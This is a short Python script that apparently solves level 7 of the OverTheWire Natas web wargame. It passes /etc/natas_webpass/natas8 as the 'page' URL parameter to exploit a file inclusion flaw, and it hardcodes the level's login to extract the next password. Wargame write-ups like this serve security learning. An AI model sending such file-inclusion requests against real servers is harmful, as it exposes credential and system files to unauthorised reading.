#!/usr/bin/env python

import requests
import re

username='natas7'
password='7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'


url = 'http://%s.natas.labs.overthewire.org/' %username

path = 'index.php?page=/etc/natas_webpass/natas8'			# Passing the password file path in the URL
response = requests.get(url + path, auth = (username, password))
content = response.text

# print content

print re.findall('<br>\n(.*)\n\n<!--', content)[0]

# On the homepage, there are links to other webpages that are passed as parameter in the URL.
# We use this path to access the password for next user